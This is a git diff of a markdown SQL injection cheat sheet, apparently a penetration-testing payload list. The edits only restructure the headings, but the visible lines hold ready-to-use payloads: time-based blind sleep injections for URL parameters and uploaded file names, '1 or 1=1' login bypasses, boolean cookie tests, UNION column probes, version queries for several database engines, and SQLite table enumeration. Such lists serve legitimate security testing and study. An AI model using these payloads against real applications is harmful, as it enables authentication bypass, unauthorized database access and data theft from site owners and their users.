@@ -1,4 +1,7 @@
-## Examples
+## SQLi Payloads
+___
+
+### Examples
 ```sql
 &topsort=flowers or sleep(3) >> Url
 
@@ -14,7 +17,7 @@
 
 filename="poc.js' (select*from(select(sleep(3)))a) '.pdf" >> Uploading File
 ```
-## Determinig SQLi Vulnerablity & Login Bypass
+### Determinig SQLi Vulnerablity & Login Bypass
 ```sql
 1 or 1=1-- - >> Input box non string.
 
@@ -24,7 +27,7 @@ filename="poc.js' (select*from(select(sleep(3)))a) '.pdf" >> Uploading File
 
 1') or 1=1-- -
 ```
-## Parameter Testing For Time Based Blind
+### Parameter Testing For Time Based Blind
 ```sql
 or sleep(5)
 
@@ -36,7 +39,7 @@ or sleep(5)
 
 (select*from(select(sleep(3)))a)
 ```
-## Cookie testing 
+### Cookie testing 
 ```sql
 ' and 1=1-- - >> Conditional response (Boolean)
 
@@ -46,7 +49,7 @@ or sleep(5)
 
 (select*from(select(sleep(3)))a)
 ```
-## Determining column numbers
+### Determining column numbers
 ```sql
 
 ' order by 1-- -
@@ -59,11 +62,11 @@ union select null, null >> Without quote in vulnerable parameter
 
 and 1=2 union select null, null >> Without quote in vulnerable parameter
 ```
-## To find a column containing strings
+### To find a column containing strings
 ```sql
 ' union select null, 'null', null-- -
 ```
-## To fetch database version
+### To fetch database version
 ```sql
 ' union select banner, null from v$version-- - >> Oracle
 
@@ -74,7 +77,7 @@ and 1=2 union select null, null >> Without quote in vulnerable parameter
 ' union select null, sqlite_version()-- - >> SQLite
 ```
 
-## To identify vulnerable columns
+### To identify vulnerable columns
 ```sql
 ' union select 1,2,3,4-- -
 
@@ -82,7 +85,7 @@ union select 1,2,3,4 >> Without quote in vulnerable parameter
 
 and 1=2 union select 1,2,3,4 >> Without quote in vulnerable parameter
 ```
-## String concatenation
+### String concatenation
 ```sql
 Oracle 	'foo'||'bar'
 Microsoft 	'foo'+'bar'
@@ -91,7 +94,7 @@ MySQL 	'foo' 'bar' [Note the space between the two strings]
 CONCAT('foo','bar')
 ```
 
-## SQLite Database info retrieving
+### SQLite Database info retrieving
 ```sql
 (SELECT group_concat(tbl_name) FROM sqlite_master)
 
